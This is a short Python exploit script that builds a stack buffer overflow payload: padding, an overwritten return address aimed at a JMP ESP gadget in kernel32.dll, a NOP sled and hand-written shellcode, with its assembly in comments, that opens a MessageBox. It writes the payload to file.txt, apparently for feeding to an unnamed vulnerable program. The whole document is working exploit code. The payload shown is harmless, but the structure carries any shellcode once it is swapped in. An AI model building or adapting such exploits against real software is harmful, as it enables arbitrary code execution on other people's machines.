garbage = "D"*512
eip = "\xCB\xC0\x8F\x75" #JMP ESP from kernel32.dll
nopsled = "\x90"*177
shellcode = "\xB8\x23\x58\xA7\x11\x2D\x11\x11\x11\x11\x6A\x14\x50\x50\x33\xC0\x50\xB8\x98\x34\x69\x11\x2D\x11\x11\x11\x11\xFF\xE0"
# I have written this shellcode which will popup a "Yes/No" MessageBox with Title and Message : iteDump
#MOV EAX,11A75823
#SUB EAX,11111111
#PUSH 14
#PUSH EAX
#PUSH EAX
#XOR EAX,EAX
#PUSH EAX
#MOV EAX,11693498
#SUB EAX,11111111
#JMP EAX
ToInsert = open("file.txt", "w")
ToInsert.write(garbage+eip+nopsled+shellcode)
ToInsert.close()